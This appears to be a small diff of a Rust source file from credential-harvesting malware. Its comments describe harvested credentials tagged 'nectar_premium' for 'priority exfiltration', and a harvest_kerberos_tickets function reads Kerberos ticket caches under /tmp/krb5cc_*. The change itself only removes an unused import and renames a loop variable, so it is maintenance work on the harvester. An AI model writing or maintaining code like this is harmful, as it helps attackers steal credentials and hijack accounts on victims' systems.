@@ -10,7 +10,7 @@
 // Results are tagged as "nectar_premium" for priority exfiltration.
 
 use std::process::Command;
-use tracing::{info, warn};
+use tracing::info;
 
 /// Harvested credential with metadata.
 #[derive(Debug, Clone)]
@@ -53,7 +53,7 @@ fn harvest_kerberos_tickets() -> Vec<LeechHarvest> {
     let mut tickets = Vec::new();
 
     // Linux: check for krb5 ticket cache
-    for cache_path in &[
+    for _cache_path in &[
         "/tmp/krb5cc_*",
         &format!("/tmp/krb5cc_{}", unsafe { libc::getuid() }),
     ] {
